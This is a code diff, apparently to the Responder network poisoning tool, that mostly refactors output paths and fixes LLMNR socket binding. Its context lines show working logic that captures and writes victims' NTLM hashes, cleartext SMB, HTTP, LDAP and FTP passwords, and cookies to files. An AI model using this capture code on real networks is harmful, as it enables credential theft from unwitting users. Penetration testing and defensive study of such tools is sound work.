@@ -49,9 +49,11 @@ if options.OURIP is None:
    parser.print_help()
    exit(-1)
 
+ResponderPATH = os.path.dirname(__file__)
+
 #Config parsing
 config = ConfigParser.ConfigParser()
-config.read('Responder.conf')
+config.read(os.path.join(ResponderPATH,'Responder.conf'))
 
 # Set some vars.
 On_Off = config.get('Responder Core', 'HTTP').upper()
@@ -108,7 +110,7 @@ def OsInterfaceIsSupported(INTERFACE):
 
 #Logger
 import logging
-logging.basicConfig(filename=str(SessionLog),level=logging.INFO,format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
+logging.basicConfig(filename=str(os.path.join(ResponderPATH,SessionLog)),level=logging.INFO,format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
 logging.warning('Responder Started')
 
 def Show_Help(ExtraHelpData):
@@ -417,13 +419,13 @@ def ParseSMBHash(data,client):
        writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
        if PrintData(outfile,User+"::"+Domain):
           print "[+]SMB-NTLMv1 hash captured from : ",client
-          outfile = "SMB-NTLMv1ESS-Client-"+client+".txt"
+          outfile = os.path.join(ResponderPATH,"SMB-NTLMv1ESS-Client-"+client+".txt")
           print "[+]SMB complete hash is :", writehash
           WriteData(outfile,writehash,User+"::"+Domain)
        logging.warning('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
 
     if NthashLen > 60:
-       outfile = "SMB-NTLMv2-Client-"+client+".txt"
+       outfile = os.path.join(ResponderPATH,"SMB-NTLMv2-Client-"+client+".txt")
        NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
        DomainLen = struct.unpack('<H',data[109:111])[0]
        DomainOffset = struct.unpack('<H',data[111:113])[0]
@@ -448,7 +450,7 @@ def ParseLMNTHash(data,client):
     if NthashLen > 25:
        Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
        logging.warning('[+]SMB-NTLMv2 hash captured from :%s'%(client))
-       outfile = "SMB-NTLMv2-Client-"+client+".txt"
+       outfile = os.path.join(ResponderPATH,"SMB-NTLMv2-Client-"+client+".txt")
        pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
        var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
        Username, Domain = tuple(var)
@@ -461,7 +463,7 @@ def ParseLMNTHash(data,client):
        logging.warning('[+]SMB-NTLMv2 complete hash is :%s'%(Writehash))
     if NthashLen == 24:
        logging.warning('[+]SMB-NTLMv1 hash captured from :%s'%(client))
-       outfile = "SMB-NTLMv1-Client-"+client+".txt"
+       outfile = os.path.join(ResponderPATH,"SMB-NTLMv1-Client-"+client+".txt")
        pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
        var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
        Username, Domain = tuple(var)
@@ -651,7 +653,7 @@ def ParseSQLHash(data,client):
        UserLen = struct.unpack('<H',data[44:46])[0]
        UserOffset = struct.unpack('<H',data[48:50])[0]
        User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
-       outfile = "MSSQL-NTLMv1-Client-"+client+".txt"
+       outfile = os.path.join(ResponderPATH,"MSSQL-NTLMv1-Client-"+client+".txt")
        if PrintData(outfile,User+"::"+Domain):
           print "[+]MSSQL NTLMv1 hash captured from :",client
           print '[+]MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal)
@@ -670,7 +672,7 @@ def ParseSQLHash(data,client):
        UserLen = struct.unpack('<H',data[44:46])[0]
        UserOffset = struct.unpack('<H',data[48:50])[0]
        User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
-       outfile = "MSSQL-NTLMv2-Client-"+client+".txt"
+       outfile = os.path.join(ResponderPATH,"MSSQL-NTLMv2-Client-"+client+".txt")
        Writehash = User+"::"+Domain+":"+NumChal+":"+Hash[:32].upper()+":"+Hash[32:].upper()
        if PrintData(outfile,User+"::"+Domain):
           print "[+]MSSQL NTLMv2 Hash captured from :",client
@@ -764,28 +766,29 @@ def FindLocalIP(Iface):
 
 def RunLLMNR():
    try:
-      ALL = "0.0.0.0"
+      ALL = '0.0.0.0'
       MADDR = "224.0.0.252"
       MPORT = 5355
       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-      if OsInterfaceIsSupported(INTERFACE) == False:
+      if IsOsX():
           print "OsX Bind to interface is not supported..Listening on all interfaces."
       if OsInterfaceIsSupported(INTERFACE):
          try:
             IP = FindLocalIP(BIND_TO_Interface)
             s.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
-            s.bind((IP,MPORT))
+            s.bind((ALL,MPORT))
             s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
             s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
-            Join = s.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR) + inet_aton(ALL))
+            Join = s.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR)+inet_aton(IP))
          except:
             print "Non existant network interface provided in Responder.conf, please provide a valid interface."
             sys.exit(1)
+
       else:
          s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
          s.bind((ALL,MPORT))
          s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
-         Join = s.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR) + inet_aton(ALL))
+         Join = s.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR)+inet_aton(ALL))
    except:
       raise
    while True:
@@ -912,7 +915,7 @@ def ParseHTTPHash(data,client):
        UserLen = struct.unpack('<H',data[36:38])[0]
        UserOffset = struct.unpack('<H',data[40:42])[0]
        User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
-       outfile = "HTTP-NTLMv1-Client-"+client+".txt"
+       outfile = os.path.join(ResponderPATH,"HTTP-NTLMv1-Client-"+client+".txt")
        WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
        if PrintData(outfile,User+"::"+Hostname):
           print "[+]HTTP NTLMv1 hash captured from :",client
@@ -935,7 +938,7 @@ def ParseHTTPHash(data,client):
        HostNameLen = struct.unpack('<H',data[44:46])[0]
        HostNameOffset = struct.unpack('<H',data[48:50])[0]
        HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
-       outfile = "HTTP-NTLMv2-Client-"+client+".txt"
+       outfile = os.path.join(ResponderPATH,"HTTP-NTLMv2-Client-"+client+".txt")
        WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
        if PrintData(outfile,User+"::"+Domain):
           print "[+]HTTP NTLMv2 hash captured from :",client
@@ -1068,7 +1071,7 @@ def PacketSequence(data,client):
     if b:
        GrabCookie(data,client)
        GrabURL(data,client)
-       outfile = "HTTP-Clear-Text-Password-"+client+".txt"
+       outfile = os.path.join(ResponderPATH,"HTTP-Clear-Text-Password-"+client+".txt")
        if PrintData(outfile,b64decode(''.join(b))):
           print "[+]HTTP-User & Password:", b64decode(''.join(b))
           WriteData(outfile,b64decode(''.join(b)), b64decode(''.join(b)))
@@ -1131,13 +1134,6 @@ def GrabHost(data,host):
           logging.warning(NoHost)
           return "NO HOST", None
 
-def HostDidntAuthBefore(client):
-    f = os.path.exists("HTTP-NTLMv2-Client-"+client+".txt")
-    if f:
-       return False
-    else:
-       return True
-
 def ProxyBasic_Ntlm(Basic):
     if Basic == "ON":
        return IIS_Basic_407_Ans()
@@ -1150,10 +1146,10 @@ def ParseDomain(data,client):
     Message = "Requested URL: %s\nComplete Cookie: %s\nClient IP is: %s\nPOST DATA: %s"%(Host, Cookie, client,PostData)
     DomainName = re.search('^(.*:)//([a-z\-.]+)(:[0-9]+)?(.*)$', Host)
     if DomainName:
-       OutFile = "HTTPCookies/HTTP-Cookie-"+DomainName.group(2)+"-"+client+".txt"
+       OutFile = os.path.join(ResponderPATH,"HTTPCookies/HTTP-Cookie-"+DomainName.group(2)+"-"+client+".txt")
        WriteData(OutFile,Message, Message)
     else:
-       OutFile = "HTTPCookies/HTTP-Cookie-"+Host.replace('/','')+"-"+client+".txt"
+       OutFile = os.path.join(ResponderPATH,"HTTPCookies/HTTP-Cookie-"+Host.replace('/','')+"-"+client+".txt")
        WriteData(OutFile,Message, Message)
 
 #Handle HTTP packet sequence.
@@ -1190,7 +1186,7 @@ def ProxyPacketSequence(data,client):
           buffer1.calculate()
           return str(buffer1)
     if b:
-       outfile = "HTTP-Proxy-Clear-Text-Password-"+client+".txt"
+       outfile = os.path.join(ResponderPATH,"HTTP-Proxy-Clear-Text-Password-"+client+".txt")
        WriteData(outfile,b64decode(''.join(b)),b64decode(''.join(b)))
        print "[+][Proxy]HTTP-User & Password:", b64decode(''.join(b))
        logging.warning('[+][Proxy]HTTP-User & Password: %s'%(b64decode(''.join(b))))
@@ -1241,7 +1237,7 @@ def ParseHTTPSHash(data,client):
        User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
        print "User is :", data[UserOffset:UserOffset+UserLen].replace('\x00','')
        logging.warning('[+]HTTPS NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
-       outfile = "HTTPS-NTLMv1-Client-"+client+".txt"
+       outfile = os.path.join(ResponderPATH,"HTTPS-NTLMv1-Client-"+client+".txt")
        WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
        WriteData(outfile,WriteHash, User+"::"+Hostname)
        print "Complete hash is : ", WriteHash
@@ -1265,7 +1261,7 @@ def ParseHTTPSHash(data,client):
        HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
        print "Hostname is :", HostName
        logging.warning('[+]HTTPS NTLMv2 Hostname is :%s'%(HostName))
-       outfile = "HTTPS-NTLMv2-Client-"+client+".txt"
+       outfile = os.path.join(ResponderPATH,"HTTPS-NTLMv2-Client-"+client+".txt")
        WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
        WriteData(outfile,WriteHash, User+"::"+Domain)
        print "Complete hash is : ", WriteHash
@@ -1292,7 +1288,7 @@ def HTTPSPacketSequence(data,client):
           return buffer1
     if b:
        GrabCookie(data,client)
-       outfile = "HTTPS-Clear-Text-Password-"+client+".txt"
+       outfile = os.path.join(ResponderPATH,"HTTPS-Clear-Text-Password-"+client+".txt")
        WriteData(outfile,b64decode(''.join(b)), b64decode(''.join(b)))
        print "[+]HTTPS-User & Password:", b64decode(''.join(b))
        logging.warning('[+]HTTPS-User & Password: %s'%(b64decode(''.join(b))))
@@ -1306,8 +1302,8 @@ class SSlSock(ThreadingMixIn, TCPServer):
     def __init__(self, server_address, RequestHandlerClass):
         BaseServer.__init__(self, server_address, RequestHandlerClass)
         ctx = SSL.Context(SSL.SSLv3_METHOD)
-        cert = config.get('HTTPS Server', 'cert')
-        key =  config.get('HTTPS Server', 'key')
+        cert = os.path.join(ResponderPATH,config.get('HTTPS Server', 'cert'))
+        key =  os.path.join(ResponderPATH,config.get('HTTPS Server', 'key'))
         ctx.use_privatekey_file(key)
         ctx.use_certificate_file(cert)
         self.socket = SSL.Connection(ctx, socket.socket(self.address_family, self.socket_type))
@@ -1367,7 +1363,7 @@ class FTP(BaseRequestHandler):
              data = self.request.recv(1024)
           if data[0:4] == "PASS":
              Pass = data[5:].replace("\r\n","")
-             Outfile = "FTP-Clear-Text-Password-"+self.client_address[0]+".txt"
+             Outfile = os.path.join(ResponderPATH,"FTP-Clear-Text-Password-"+self.client_address[0]+".txt")
              WriteData(Outfile,User+":"+Pass, User+":"+Pass)
              print "[+]FTP Password is: ", Pass
              logging.warning('[+]FTP Password is: %s'%(Pass))
@@ -1413,7 +1409,7 @@ def ParseLDAPHash(data,client):
        UserOffset = struct.unpack('<H',data[82:84])[0]
        User = SSPIStarts[UserOffset:UserOffset+UserLen].replace('\x00','')
        writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
-       Outfile = "LDAP-NTLMv1-"+client+".txt"
+       Outfile = os.path.join(ResponderPATH,"LDAP-NTLMv1-"+client+".txt")
        WriteData(Outfile,writehash,User+"::"+Domain)
        print "[LDAP] NTLMv1 complete hash is :", writehash
        logging.warning('[LDAP] NTLMv1 complete hash is :%s'%(writehash))
@@ -1448,7 +1444,7 @@ def ParseLDAPPacket(data,client):
              PassLen = struct.unpack('<b',data[20+UserDomainLen+1:20+UserDomainLen+2])[0]
              Password = data[20+UserDomainLen+2:20+UserDomainLen+2+PassLen]
              print '[LDAP]Clear Text User & Password is:', UserDomain+":"+Password
-             outfile = "LDAP-Clear-Text-Password-"+client+".txt"
+             outfile = os.path.join(ResponderPATH,"LDAP-Clear-Text-Password-"+client+".txt")
              WriteData(outfile,'[LDAP]User: %s Password: %s'%(UserDomain,Password),'[LDAP]User: %s Password: %s'%(UserDomain,Password))
              logging.warning('[LDAP]User: %s Password: %s'%(UserDomain,Password))
           if sasl == "\xA3":
@@ -1544,7 +1540,7 @@ class ThreadingUDPServer(ThreadingMixIn, UDPServer):
            try:
               self.socket.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
            except:
-              print "Non existant network interface provided in Responder.conf, please provide a valid interface."
+              pass
         UDPServer.server_bind(self)
 
 class ThreadingTCPServer(ThreadingMixIn, TCPServer):
@@ -1554,7 +1550,7 @@ class ThreadingTCPServer(ThreadingMixIn, TCPServer):
            try:
               self.socket.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
            except:
-              print "Non existant network interface provided in Responder.conf, please provide a valid interface."
+              pass
         TCPServer.server_bind(self)
 
 ThreadingUDPServer.allow_reuse_address = 1
